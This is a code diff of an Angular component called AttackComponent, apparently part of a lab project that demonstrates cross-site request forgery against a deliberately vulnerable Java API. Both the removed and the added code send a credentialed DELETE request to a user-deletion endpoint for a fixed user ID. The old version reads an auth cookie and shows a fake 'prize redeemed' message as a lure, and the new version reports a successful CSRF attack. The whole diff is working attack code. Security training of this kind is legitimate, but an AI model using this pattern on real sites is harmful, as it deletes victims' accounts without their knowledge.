@@ -10,32 +10,23 @@ export class AttackComponent {
   constructor(private http: HttpClient) {}
 
   attack() {
-    const token = this.getCookie("auth-token");
-    const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
-  
-    this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/f9252b24-586f-48ac-9132-204843577251', {
-      headers,
-      withCredentials: true
-    }).subscribe({
-      next: () => alert('Prêmio resgatado com sucesso!'),
-      error: (err) => console.error('Erro no ataque CSRF:', err)
+    fetch('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
+      method: 'DELETE',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    })
+    .then(response => {
+      if (response.ok) {
+        alert('Ataque CSRF bem sucedido!');
+      } else {
+        throw new Error('Falha na requisição');
+      }
+    })
+    .catch(error => {
+      console.error('Erro no ataque CSRF:', error);
+      alert('Falha no ataque: ' + error.message);
     });
   }
-
-  // getCookie(name: string): string | null {
-  //   const value = `; ${document.cookie}`;
-  //   const parts = value.split(`; ${name}=`);
-  //   if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
-  //   return null;
-  // }
-  getCookie(name: string): string | null {
-      const cookies = document.cookie.split('; ');
-      for (const cookie of cookies) {
-        const [key, value] = cookie.split('=');
-        if (key === name) {
-          return value;
-        }
-      }
-      return null;
-  }    
 }
